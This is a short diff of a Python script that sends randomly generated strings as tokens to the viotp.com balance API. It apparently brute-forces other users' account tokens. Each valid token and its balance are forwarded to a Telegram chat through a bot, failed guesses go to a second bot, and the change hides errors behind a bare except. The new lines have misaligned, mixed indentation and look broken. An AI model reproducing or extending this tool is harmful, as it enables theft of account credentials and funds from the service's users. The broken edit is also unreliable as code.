@@ -29,15 +29,17 @@ def check_balance(random_string):
 	"""Checks the balance using the provided random string."""
 	url = f"https://api.viotp.com/users/balance?token={random_string}"
 	response = requests.get(url).json()
-	if response["status_code"]==200:
-		print(f"\033[92mSuccess! Random string: {random_string}\033[0m")
-		print(f"Balance: {response['data']['balance']}")
-		message = f"{random_string}_____{response['data']['balance']}"
-		bot.send_message(chat_id, message)
-	else:
-		print(f"\033[91mFail! Random string: {random_string}\033[0m")
-		message2 = f"{random_string}"
-		bot2.send_message(chat_id2, message2)
+	try:
+		if response["status_code"]==200:
+		        print(f"\033[92mSuccess! Random string: {random_string}\033[0m")
+		        print(f"Balance: {response['data']['balance']}")
+		        message = f"{random_string}_____{response['data']['balance']}"
+		        bot.send_message(chat_id, message)
+	        else:
+		        print(f"\033[91mFail! Random string: {random_string}\033[0m")
+		        message2 = f"{random_string}"
+		        bot2.send_message(chat_id2, message2)
+	except:pass
 
 
 
